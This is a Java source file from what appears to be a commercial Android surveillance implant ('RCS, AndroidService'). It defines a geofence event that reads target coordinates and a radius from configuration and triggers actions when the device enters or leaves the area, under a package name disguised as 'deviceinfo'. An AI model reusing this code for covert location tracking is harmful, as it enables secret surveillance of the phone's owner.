/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventLocation.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.event;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfEvent;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.deviceinfo.module.position.GPSLocator;
import com.android.deviceinfo.module.position.GPSLocatorDistance;
import com.android.deviceinfo.module.position.RangeObserver;
import com.android.deviceinfo.util.Check;

public class EventLocation extends BaseEvent implements RangeObserver {

	private static final String TAG = "EventLocation"; //$NON-NLS-1$
	int actionOnEnter;
	int actionOnExit;

	int distance;
	float latitudeOrig;
	float longitudeOrig;
	GPSLocator locator;

	@Override
	public void actualStart() {
		locator = new GPSLocatorDistance(this, latitudeOrig, longitudeOrig, distance);
		locator.start();
	}

	@Override
	public void actualStop() {
		locator.halt();

		try {
			locator.join();
		} catch (final InterruptedException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		locator = null;

		onExit(); // di sicurezza
	}

	@Override
	public boolean parse(ConfEvent conf) {
		try {
			distance = conf.getInt("distance");

			latitudeOrig = (float) conf.getDouble("latitude");
			longitudeOrig = (float) conf.getDouble("longitude");

			if (Cfg.DEBUG) {
				Check.log(TAG + " Lat: " + latitudeOrig + " Lon: " + longitudeOrig + " Dist: " + distance);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}
		} catch (final ConfigurationException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			return false;
		}

		return true;
	}

	@Override
	public void actualGo() {
	}

	public int notification(Boolean onEnter) {
		if (Cfg.DEBUG) {
			Check.log(TAG + "  " + (onEnter ? "Entered" : "Exited"));
		}
		if (onEnter) {
			onEnter();
		} else {
			onExit();
		}

		return 0;
	}
}
